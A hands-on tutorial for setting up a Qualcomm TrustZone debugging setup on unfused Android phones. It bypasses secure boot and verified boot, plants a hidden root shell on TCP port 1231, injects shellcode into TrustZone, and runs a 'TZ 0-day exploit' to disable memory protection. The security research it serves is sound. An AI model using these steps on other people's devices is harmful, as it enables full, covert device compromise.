# Setting up a Qualcomm Trustzone Aarch64 Debug Playground for Android
## Part 1

##### Introduction

TLDR: 

```
Grab an smartphone with secure boot unfused 
Qualcomm Chipset, set it up for Trustzone 
debugging and start pwning it.
```
   
BTW:

```  
This will work for both enduser devices and
development board and give us full EL0-EL3
control.
```

Requirements :
- Any unfused MSM8974,MSM8976,MSM8953,MSM8937,etc. X6, X8 
  or X9 modem based Qualcomm (NOT SDM one), here 
  I used a BQ X Pro and a Oneplus One smartphone for reference

- python 3.x installed

<br/>
<br/>

##### 1. Verifying if the device is vulnerable to cold-patching
1.1. Install latest adb and fastboot
  ```
  ~ $ mkdir ~/bin
  ~ $ cd ~/bin
  ~/bin $ wget https://dl.google.com/android/repository/platform-tools-latest-linux.zip; unzip platform-tools-latest-linux.zip; rm platform-tools-latest-linux.zip
  ~/bin $ cd ..
  ```
  adb should be available after rebooting the host pc (if path is included in ~/.profile)
  
1.2. Install my qualcomm emergency download tools (edl)
  ``` 
  ~ $ git clone https://github.com/bkerler/EDL edl
  ~ $ cd edl
  ~/edl $ python3 -m pip install pyusb pyserial
  ~/edl $ sudo 'echo "blacklist qcserial" >> /etc/modprobe.d/blacklist.conf'
  ~/edl $ sudo cp Drivers/51-edl.rules /etc/udev/rules.d
  ~/edl $ sudo cp Drivers/50-android.rules /etc/udev/rules.d
  ~/edl $ sudo udevadm control -R
  ```

1.3. Grab any EDL Loader matching your device (from firmware) and put it into the "Loaders" directory 
     and rename it to match the displayed structure [msmid]_[pkhash 8 bytes].bin or use the provided 
     fhloaderparse.py script.
    
  
      Example for directly copying BQ X Pro loader :
      ```
      ~/edl $ cp 000460E100000000_cc3153a80293939b_FHPRG_bqXPro.bin Loaders
      ```
      
      Example for directly copying Oneplus One loader :
      ```
      ~/edl $ cp 007BC0E100000000_cc3153a80293939b_FHPRG_OnePlusOne.bin Loaders
      ```
      
      Example using the fhloaderparse script:
      ```
      ~/edl $ mkdir test
      ~/edl $ cp emmc_prog_firehose.bin test
      ~/edl $ ./fhloaderparse.py test
      ```
  
 
1.4. Power off the smartphone, press volume down and volume up and
     connect the usb cable. The device should enter the 9008 mode.

1.5. Verify if the device is vulnerable to cold-patching qualcomm firmware :
      ```
      ~/edl $ ./edl.py -secureboot
    
        Qualcomm Sahara / Firehose Client (c) B.Kerler 2018-2019.
    
        __main__ - Trying with loaders in Loader directory ...
        __main__ - Waiting for the device
        __main__ - Device detected :)
        __main__ - Mode detected: sahara
        Device is in EDL mode .. continuing.
        Library.sahara - 
        ------------------------
        HWID:              0x007bc0e100000000 (MSM_ID:0x007bc0e1,OEM_ID:0x0000,MODEL_ID:0x0000)
        PK_HASH:           0xcc3153a80293939b90d02d3bf8b23e0292e452fef662c74998421adad42a380f
        Serial:            0x0d7e015b
        SBL Version:       0x00000000
        
        Library.sahara - Unfused device detected, so any loader should be fine...
        Library.sahara - Trying loader: Loaders/qualcomm/007BC0E100000000_cc3153a80293939b_FHPRG_OnePlusOne.bin
        Successfully uploaded programmer :)
        
        Library.firehose - TargetName=MSM8974
        Library.firehose - MemoryName=eMMC
        Library.firehose - Version=1
        Library.firehose - Peek: Address(0xfc4b83f8),Size(0x4)
        Progress: |██████████████████████████████████████████████████| 100.0% Complete
        Sec_Boot0 PKHash-Index:0 OEM_PKHash: False Auth_Enabled: False Use_Serial: False
        Sec_Boot1 PKHash-Index:0 OEM_PKHash: False Auth_Enabled: False Use_Serial: False
        Sec_Boot2 PKHash-Index:0 OEM_PKHash: False Auth_Enabled: False Use_Serial: False
        Sec_Boot3 PKHash-Index:0 OEM_PKHash: False Auth_Enabled: False Use_Serial: False
        Secure boot disabled.
      ```
    
      If the tool says "Secure boot disabled", it means that you can coldpatch and fully pwn the device :)

<br/>
<br/>

##### 2. Getting device firmware

###### Dump directly from the device
- Dump the stock device boot, aboot and tz partition :
  ```
  ~/edl $ ./edl.py -r boot boot.img
   
    Qualcomm Sahara / Firehose Client (c) B.Kerler 2018-2019.
    
    
    __main__ - Trying with loaders in Loader directory ...
    __main__ - Waiting for the device
    __main__ - Device detected :)
    __main__ - Mode detected: firehose
    
    
    Library.firehose - TargetName=MSM8974
    Library.firehose - MemoryName=eMMC
    Library.firehose - Version=1
    Library.firehose - 
    Reading from physical partition 0, sector 196608, sectors 32768
    Progress: |██████████████████████████████████████████████████| 100.0% Complete
    Dumped sector 196608 with sector count 32768 as boot.img.

  ```
  if the tool says "__main__ - USB desync, please rerun command !", you just need to rerun the command.
  
  ```
  ~/edl $ ./edl.py -r aboot aboot.img
  ~/edl $ ./edl.py -r tz tz.img
  ```
  Now we can leave the edl folder.
  ```
  ~/edl $ cd ..
  ```

####### or getting the device firmware to attack

- 64 Bit BQ Aquaris X Pro MSM8953
    2.7.2_20190620-1410-bardockpro_bq-user-2169-Fastboot-FW.zip
    ```
    https://storage.googleapis.com/otas/2017/Smartphones/Bardock_Pro/OTA_Official/Oreo/2.7.2/2.7.2_20190620-1410-bardockpro_bq-user-2169-Fastboot-FW.zip
    ```

- 32 Bit Oneplus One MSM8974
    cm-13.1.2-ZNH2KAS3P0-bacon-signed-fastboot.zip
    ````
    https://www.androidfilehost.com/?fid=24591000424960109
    ````

<br/>
<br/>


##### 3. Getting my qc attack framework and installing it
3.1. Grabbing the latest version of my attack tools
  ```
  ~ $ git clone https://github.com/bkerler/qcpatchtools
  ~ $ cd qcpatchtools
  ```

3.2. Install capstone + keystone engine:
    ```
    
    ~/qcpatchtools $ git clone https://github.com/keystone-engine/keystone --recursive
    ~/qcpatchtools $ cd keystone && mkdir -p build && cd build && cmake .. 
    ~/qcpatchtools/keystone $ ../make-lib.sh
    ~/qcpatchtools/keystone $ sudo make install 
    ~/qcpatchtools/keystone $ cd bindings/python
    ~/qcpatchtools/keystone/bindings/python $ sudo python3 setup.py build install
    ~/qcpatchtools/keystone/bindings/python $ cd ~/qcpatchtools
    ~/qcpatchtools $ rm -rf keystone
    ```
    ```
    ~/qcpatchtools $ git clone https://github.com/aquynh/capstone --recursive
    ~/qcpatchtools $ cd capstone
    ~/qcpatchtools/capstone $ ./make.sh
    ~/qcpatchtools/capstone $ sudo ./make.sh install
    ~/qcpatchtools/capstone $ cd bindings/python
    ~/qcpatchtools/capstone/bindings/python $ sudo python3 setup.py build install
    ~/qcpatchtools/capstone/bindings/python $ cd ~/qcpatchtools
    ~/qcpatchtools $ rm -rf capstone
    ```
  
3.3. Install requirements :
   ```
   ~/qcpatchtools $ sudo pip3 install -r requirements.txt
   ```

3.4. Now we can leave the qcpatchtools folder.
  ```
  ~/qcpatchtools $ cd ~
  ```
  
<br/>
<br/>


##### 4. Modding the stock kernel

###### 64 Bit BQ Aquaris X Pro MSM8953
4.1. Grab the latest kernel matching your device firmware version
  ```
  ~ $ git clone https://github.com/bq/aquaris-X-Pro.git
  ~ $ mv aquaris-X-Pro kernel
  ~ $ cd kernel
  ~/kernel $ git checkout tags/2.5.1_20190114-1551
  ~/kernel $ cd ..
  ~ $ git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9
  ~ $ cd aarch64-linux-android-4.9
  ~/aarch64-linux-android-4.9 $ git checkout 22f053ccdfd0d73aafcceff3419a5fe3c01e878b
  ~/aarch64-linux-android-4.9 $ cd ..
  ~ $ mkdir KERNEL_OUT
  ```

4.2. Grab my fancy patch which adds custom svc handler (see Gal Beniamini's Blog) but
also removes xpu restrictions and adds additional logging of tz svc

  ```
  ~ $ patch -p1 -d kernel < qcpatchtools/patches/kernel_bq_msm8953.diff
  ```

4.3. Compile the custom kernel
  ```
  ~ $ make -C kernel O=../KERNEL_OUT ARCH=arm64 CROSS_COMPILE=../aarch64-linux-android-4.9 bardockpro_defconfig
  ~ $ make -j4 O=../KERNEL_OUT/ -C kernel ARCH=arm64 CROSS_COMPILE=../aarch64-linux-android-4.9/bin/aarch64-linux-android-
  ~ $ cp KERNEL_OUT/arch/arm64/boot/Image.gz-dtb zkernel
  ```

<br/>

###### 32 Bit Oneplus One MSM8974
4.1. Grab the latest kernel matching your device firmware version
  ```
  ~ $ git clone https://github.com/LineageOS/android_kernel_oneplus_msm8974 -b cm-13.0 kernel
  ~ $ git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9
  ~ $ cd arm-linux-androideabi-4.9
  ~/arm-linux-androideabi-4.9 $ git checkout 10ddded24ecdbdeaa4ac57d49962ca06e9c1ceaa
  ~/arm-linux-androideabi-4.9 $ cd ..
  ~ $ mkdir KERNEL_OUT
  ```

4.2. Grab my fancy patch which adds custom svc handler (see Gal Beniamini's Blog) but
  also removes xpu restrictions and adds additional logging of tz svc
  ```
  ~ $ patch -p1 -d kernel < qcpatchtools/patches/kernel_oneplus_msm8974.diff
  ```

4.3. Compile the custom kernel
  ```
  ~ $ make -C kernel O=../KERNEL_OUT ARCH=arm CROSS_COMPILE=../arm-linux-androideabi-4.9 cyanogenmod_bacon_defconfig
  ~ $ make -j4 O=../KERNEL_OUT/ -C kernel ARCH=arm CROSS_COMPILE=../arm-linux-androideabi-4.9/bin/arm-linux-androideabi-
  ~ $ cp KERNEL_OUT/arch/arm/boot/zImage zkernel
  ```
  We don't copy the zImage-dtb over here because the oneplus uses specific dtb modded android
  and is already contained when extracting the boot image.
  
<br/>
<br/>

##### 5. Rooting the stock kernel

In order to have our own rooted kernel we add our own
reverse shell via adb to enable tz debugging on a locked 
retail BQ X smartphone using my Android_Universal and EDL
Scripts

5.1. Install the android_universal toolkit
```
~ $ git clone https://github.com/bkerler/android_universal
```
   
5.2. Root the stock image and add a fake root (in order to bypass
  AVBv1 Root of Trust):
```
  ~ $ cd edl
  ~/edl $ cp boot.img ../android_universal
  ~/edl $ cd ~/android_universal
```
  
  ###### 32 Bit Oneplus One MSM8974
  The Oneplus One is signed by google test loaders, so you can flash directly
  the boot.img.signed file. 
  ```
  ~/android_universal $ ./makeramdisk.sh -fn boot.img -c -fs 1
  ```
   
   <br/>
   
   ###### 64 Bit BQ Aquaris X Pro MSM8953
   As the MSM8953 devices implement Android Verified Boot v1, you will need
   to flash the file called "boot.img.rotfake".
   ```
   ~/android_universal $ ./makeramdisk.sh -fn boot.img -c
   ```

5.3. The makeramdisk tool will halt for adding custom files to the boot image. In another shell, run :
```
~/android_universal $ cp ../zkernel tmp/kernel 
~/android_universal $ cd ..     
```

Then press enter in the makeramdisk tool to let it finish making and signing the boot image.
  
<br/>
<br/>

##### 6. Prepare tz shellcode for code injection (either cold patch or hot patch)

6.1. Save the appropriate shellcode into a file "shellcode.txt"
   ###### 32 Bit Oneplus One MSM8974
      ```
      # R0 = writeflag (0=read, 0x22=write), R1=addr, R2=value, R3=readmemptr
      PUSH {R4-R6,LR}
      CMP  R0, #0x22
      BEQ  write
      LDR  R0, [R1]
      STR  R0, [R3]
      B exit
      write:
      STR  R2, [R1]
      exit:
      POP {R4-R6,PC}
      ```
   
   <br/>

   ###### 64 Bit BQ Aquaris X Pro MSM8953  
      ```
      # X0 = writeflag (0=read, 0x22=write), R1=addr, R2=value
      STP X28, X27, [SP,#-0x60]!
      STP X26, X25, [SP,#0x10]
      STP X24, X23, [SP,#0x20]
      STP X22, X21, [SP,#0x30]
      STP X20, X19, [SP,#0x40]
      STP X29, X30, [SP,#0x50]
      MOV X29, SP
      
      # Value of arg0 0x22 means write dword from arg2 to address arg1, 
      # Value of arg0 0x0  means read dword from arg2
      CMP  W0, #0x22 
      BEQ  write
      LDR  W0, [X1]
      B exit
      write:
      STR  W2, [X1]
        
      exit:
      LDP X29, X30, [SP,#0x50]
      LDP X20, X19, [SP,#0x40]
      LDP X22, X21, [SP,#0x30]
      LDP X24, X23, [SP,#0x20]
      LDP X26, X25, [SP,#0x10]
      LDP X28, X27, [SP],#0x60
      RET
      ```

<br/>
<br/>

##### 7. Patching tz to allow code injection by injecting our shellcode
7.1. Coldpatching the tz with our own shellcode into a codecave

   ```
   ~ $ cd qcpatchtools
   ```
   
   <br/>
     
   ###### 32 Bit Oneplus One MSM8974
   ```
   ~/qcpatchtools $ ../tz_coldpatch32.py -in tz.mbn -out tz.patched -sc shellcode.txt 
        Found svc_entry_offset: 0xfe826104.
        Possible code cave at 0xfe809c8d, file offset: 0x30b8c
        svc code: 0x0C06 (svc 0x03 cmd 0x06)
        Code to patch:70b5222802d00868106000e00a6070bd
        Patching done, saved as tz.patched
   ```
   
   <br/>
    
   ###### 64 Bit BQ Aquaris X Pro MSM8953 
   ```
      ~/qcpatchtools $ ./tz_coldpatch64.py -in ../edl/tz.img -out tz.img.patched -sc shellcode.txt
        Found code cave at 0x8657871c, file offset: 0x5c71c, svc code: 0x0200020D
        Code to patch:1f88007160000054200040b9c0035fd6220000b9c0035fd6
        Patching done, saved as tz.img.patched
   ```

<br/>
  
7.2. Sign the tz.bin using own generated private key
  ```
  ~/qcpatchtools $ ./qc_signer.py -t qsee -in tz.img.patched -out tz.signed
  ```

<br/>
<br/>

##### 8. Patching aboot to allow custom ramdisk (only needed for devices with AVB, skip this step for OnePlus MSM8974)
 8.1. Patching aboot
 
 <br/>
 
  ###### 32 Bit Oneplus One MSM8974
  - Not needed
 
 <br/>
  
  ###### 64 Bit BQ Aquaris X Pro MSM8953 
  - Coldpatch aboot to bypass root of trust
    ```
    ~/qcpatchtools $ ./aboot_rot64.py -in ../edl/aboot.img -out aboot.patched
    ```

  - Sign the tz.bin
    ```
    ~/qcpatchtools $ ./qc_signer.py -in aboot.bin -out aboot.signed -t appsbl
    ~/qcpatchtools $ rm aboot.patched
    ```
<br/>
<br/>

##### 9. Flashing modded files

<br/>

###### 32 Bit Oneplus One MSM8974

  9.1. Copy patched boot and tz to the EDL directory
  ```
  ~/qcpatchtools $ cp tz.signed ../edl/ && cd ..
  ~/qcpatchtools $ cd ..
  ~ $ cp android_universal/boot.img.signed edl/
  ```
  
  9.2. Power off the smartphone (reboot keeping 
    volume down + power pressed), press volume down and volume up and
    connect the usb cable. The device should enter the 9008 mode.
  ```
  ~ $ cd edl/
  ~/edl $ ./edl.py -w boot boot.img.signed
  ~/edl $ ./python3 edl.py -w tz tz.signed
  ```
  - Reboot the device, it should be rooted

  9.3. Reboot the device, it should be rooted

<br/>

###### 64 Bit BQ Aquaris X Pro MSM8953  
  9.1. Copy patched boot, tz and aboot to the EDL directory
  ```
  ~/edl $ cd ~
  ~ $ cp qcpatchtools/aboot.signed qcpatchtools/tz.signed ../edl/
  ~ $ cp android_universal/boot.rotfake edl/
  ~ $ cd /edl
  ```
  
  9.2. Power off the smartphone (reboot keeping 
    volume down + power pressed), press volume down and volume up and
    connect the usb cable. The device should enter the 9008 mode.
  ```
  ~/edl $ ./edl.py -w boot boot.rotfake
  ~/edl $ ./edl.py -w aboot aboot.signed
  ~/edl $ ./edl.py -w tz tz.signed
  ~/edl $ cd ..
  ```
 9.3. If the device reboots and enters usb pid 0x900E or 0x9006,
     open up the device, remove the battery connector and usb cable,
     short emmc clk pin to ground, connect usb cable, remove the short,
     and connect the battery connector. The device should then enter 
     back to EDL usb pid 0x9008 and can then be flashed using
      
 9.4. Reboot the device, it should be rooted
  
<br/>
<br/>

##### 10. Testing if device is rooted :D
10.1. TZ failure unbricking process:
  ###### In case the device reboots all the time into 0x9006 mode:
   ```
   ~/edl $ ./edl.py -vid 0x05c6 -pid 0x9006
   ```
   
   The device will then be available as partition.
   In order to enable edl to flash back a working tz,
   we backup and erase sbl1 : 
  
   ```
   ~/edl $ dd if=/dev/disk/by-part-label/sbl1 of=sbl1.bin
   ~/edl $ dd if=/dev/zero of=/dev/disk/by-part-label/sbl1
   ```
      
   and then in edl mode (0x9008), we write back a working sbl1 and working tz:
      
   ```
   ~/edl $ ./edl.py -w sbl1 sbl1.img
   ~/edl $ ./edl.py -w tz tz.img
   ```
    
   - Copy the custom adb key (any other will be refused):
   ```
   ~ $ cd ../android_universal
   ~/android_universal $ ./install_adb_key.sh
   ```

<br/>

  ####### In case the device reboots all the time into 0x900E mode:
  - If the device doesn't boot (red light) and enters usb pid
    0x900E mode, it means the signature was invalid. You will
    then need to short DAT0 with GND on boot of the
    mobile (without battery) to enter 0x9008 mode. Then
    connect the battery again to reflash the firmware using edl.

      ```
      ~/edl $ ./edl.py -w tz tz.img
      ```

<br/>

10.2. Copy the custom adb key (any other will be refused):
  
  ```
  ~ $ cd ../android_universal
  ~/android_universal $ ./install_adb_key.sh
  ```

10.3. To get a root shell, you need to connect to the hidden
        root shell via tcp port 1231 on the device. You won't 
        see a prompt, so just enter your command and press enter.
        
``` 
$ adb shell
bardock-pro:/ $ toybox nc 0.0.0.0 1231
root@bardock:/ # id
        uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
root@bardock:/ # uname -a
        Linux localhost 3.18.71-perf-g18b9c9b33ae-dirty #1 SMP PREEMPT Tue Feb 26 14:18:30 CET 2019 aarch64
root@bardock:/ # getprop | grep 8.1
        [net.tcp.buffersize.lte]: [2097152,4194304,8388608,262144,524288,1048576]
        [net.tcp.buffersize.wifi]: [524288,2097152,4194304,262144,524288,1048576]
        [ril.ecclist]: [911,112,*911,#911,000,08,110,999,118,119,122]
        [ril.ecclist1]: [911,112,*911,#911,000,08,110,999,118,119]
        [ro.bootimage.build.fingerprint]: [bq/bardock-pro/bardock-pro:8.1.0/OPM1.171019.026/1492:user/release-keys]
        [ro.boottime.adbd]: [5047811195]
        [ro.boottime.cnd]: [6851364840]
        [ro.boottime.cnss-daemon]: [6891754944]
        [ro.boottime.keystore]: [6871139580]
        [ro.boottime.mediadrm]: [6872873851]
        [ro.boottime.nfc_hal_service]: [4955175831]
        [ro.boottime.nvtool]: [6861805830]
        [ro.boottime.nxpnfc_hal_svc]: [4962930831]
        [ro.boottime.ril-daemon]: [6887123642]
        [ro.boottime.storaged]: [6882149788]
        [ro.boottime.time_daemon]: [6853684111]
        [ro.boottime.tombstoned]: [6930821819]
        [ro.boottime.vndservicemanager]: [4090654841]
        [ro.build.description]: [bardockpro_bq-user 8.1.0 OPM1.171019.026 1492 release-keys]
        [ro.build.fingerprint]: [bq/bardock-pro/bardock-pro:8.1.0/OPM1.171019.026/1492:user/release-keys]
        [ro.build.version.base_os]: [bq/bardock-pro/bardock-pro:8.1.0/OPM1.171019.026/1422:user/release-keys]
        [ro.build.version.release]: [8.1.0]
        [ro.com.google.gmsversion]: [8.1_201810]
```

<br/>
<br/>

##### 11. Talk to the tz (reading tz memory)

<br/>  

  ###### 32 Bit Oneplus One MSM8974
  - Read memory dword from within the tz (Address: 0xFE82CDA0)
  
  ```
  $ adb forward tcp:1231 tcp:1231
  $ adb push qcxploit /data/local/tmp
  $ nc localhost 1231
  root@bacon:/ # cd /data/local/tmp
  root@bacon:/data/local/tmp # ./qcxploit exploit8974
  root@bacon:/data/local/tmp # ./qcxploit readmem 0xFE82CDA0 4
  0xFE805738
  385780FE
  ```
 
 <br/>
 
  ###### 64 Bit BQ Aquaris X Pro MSM8953
  - Read memory dword from within the tz (Address: 0x8657871c)
  
  ```
  $ adb forward tcp:1231 tcp:1231
  $ adb push qcxploit /data/local/tmp
  $ nc localhost 1231
  root@bardock:/ # cd /data/local/tmp
  root@bardock:/data/local/tmp # ./qcxploit readmem 8657871c 4
  Sending SVC: 0x200020d
  Data:
  0xA9BA6FFC
  FC6FBAA9
  ```

<br/>
<br/>

##### 12. Hot patch tz (writing to code cave)

  <br/>

  ###### 32 Bit Oneplus One MSM8974
 
   12.1. Disabling XPU
   
   ```
        root@bacon:/ # /data/local/tmp/qcxploit svcreg32 03 06 03 0x22 0xFC48B080 0x0
        Sending SVC: 0x10, CMD: 0x2
        IOCTL RES: 0x0000001E

        root@bacon:/ # /data/local/tmp/qcxploit exploit8974
        MSM8974 TZ 0-day exploit by B.Kerler 2017
        Do not share, Law Enforcement Only / strictly confidential !
        ----------------------------------------------------------
        Disable NS Blacklist
        Zeroing out IMEM
        Refreshing NS Blacklist
        Done exploiting
   ```
   
   12.2. Reading / Writing
   - Reading dword
       ```
       root@bacon:/ # /data/local/tmp/qcxploit svcreg32 03 06 03 0x0 0x[addr_to_read] 0x[bufferaddr]
       ```

   - Writing dword   
       ```
       root@bacon:/ # /data/local/tmp/qcxploit svcreg32 03 06 03 0x22 0x[addr_to_write] 0x[value_to_write]
       ```

   - Reading after xpu disabled
       ```
       root@bacon:/ # /data/local/tmp/qcxploit readmem [addr_to_read] [length_to_read]
       ```

   - Writing after xpu disabled   
       ```
       root@bacon:/ # /data/local/tmp/qcxploit writemem [addr_to_write] [value_to_write_as_hexstring]
       ```
     
   12.2. Generating shellcode
   
   ```
        ~/qcpatchtools ~ Tools/asmtools.py -asm arm,thumb -in ShellCode/shellcode_examples/read_write_shellcode_arm.txt 
            CPU: arm, MODE: thumb
            70b5222802d00868106000e00a6070bd
   ```
        
   12.3. Injecting shellcode (0xfe809c8d is your code cave offset from 7.1.)
   
   ```
        root@bacon:/data/local/tmp # ./qcxploit writemem FE809C8D 70b5222802d00868106000e00a6070bd
   ```
    
   12.4. Running injected shellcode :
   
   ```
        root@bacon:/data/local/tmp # ./qcxploit svcreg32 06 03 03 0 0xFE808796 0xFE82830c
            Sending SVC: 0xc, CMD: 0xe
            IOCTL RES: 0x0000003E
        root@bacon:/data/local/tmp # ./qcxploit readmem 0xFE82830C 4
            Memory read:
           70B5042B
   ```

   12.5. For faults, see /d/tzdbg/log
  
  <br/>
  
  ###### 64 Bit BQ Aquaris X Pro MSM8953
   12.1. Disabling XPU
        
   - Disable HWIO_BIMC_S_DDR0_XPU_SCR_ADDR (optional, however disables tz key)
     ```
     root@bardock:/ # ./qcxploit svcreg 200020D 4 22 44a000 13f 0
     ```
        
   - Disable HWIO_BIMC_S_DDR0_XPU_CR_ADDR
     ```
     root@bardock:/ # ./qcxploit svcreg 200020D 4 22 44a080 19e 0
     ```
        
   - Disable HWIO_OCIMEM_MPU_XPU_SCR_ADDR (optional, however disables tz key)
     ```
     root@bardock:/ # ./qcxploit svcreg 200020D 4 22 53000 13f 0
     ```
        
   - Disable HWIO_OCIMEM_MPU_XPU_CR_ADDR
     ```
     root@bardock:/ # ./qcxploit svcreg 200020D 4 22 53080 11f 0
     ```
          
   - Disable write protection by changing the memory area to be protected
     not to point to the start of tz code area, but instead to point to
     the end of tz code area (writing the end addr 0x866f0000 to 
     HWIO_BIMC_S_DDR0_XPU_PRT2_START0_ADDR) <-- tz bug
     ```
     root@bardock:/ # ./qcxploit svcreg 200020D 4 22 44a340 866f0000 0
     ```
          
   12.2. Enable debug logs from tz
   ```
   root@bardock:/ # mount -t debugfs debugfs /d/
   root@bardock:/ # ls /d/tzdbg
   ```
          
   12.3. We can now upload any code using devmem directly to the tz
         (here: write code to tz for svc cmd 0x200030F)
   ```     
   root@bardock:/ # ./busybox devmem 0x865ef918
   root@bardock:/ # ./busybox devmem 0x865ef918 32 0x865630fc
   root@bardock:/ # ./busybox devmem 0x865ef918 32 0x86572214
   root@bardock:/ # ./busybox devmem 0x8657221C 32 0xD2800000
   root@bardock:/ # ./qcxploit svcreg 200030F 4 0 53000 13e 0
   ```